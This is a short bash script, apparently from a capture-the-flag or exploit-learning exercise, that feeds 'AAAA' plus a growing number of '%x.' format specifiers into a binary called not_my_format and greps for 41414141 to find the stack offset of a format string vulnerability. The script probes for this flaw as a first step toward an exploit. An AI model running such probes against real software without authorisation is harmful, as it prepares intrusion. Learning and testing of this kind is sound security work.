#!/bin/bash

for ((test=0; test<=30; test++)); do
    output=$(python -c "print 'AAAA' + '%x.'*$test + '%x'" | ./not_my_format | grep "41414141")
    if [ -n "$output" ]; then
        echo "Найдена строка '41414141' для теста $test"
	echo "$output"
    fi
done

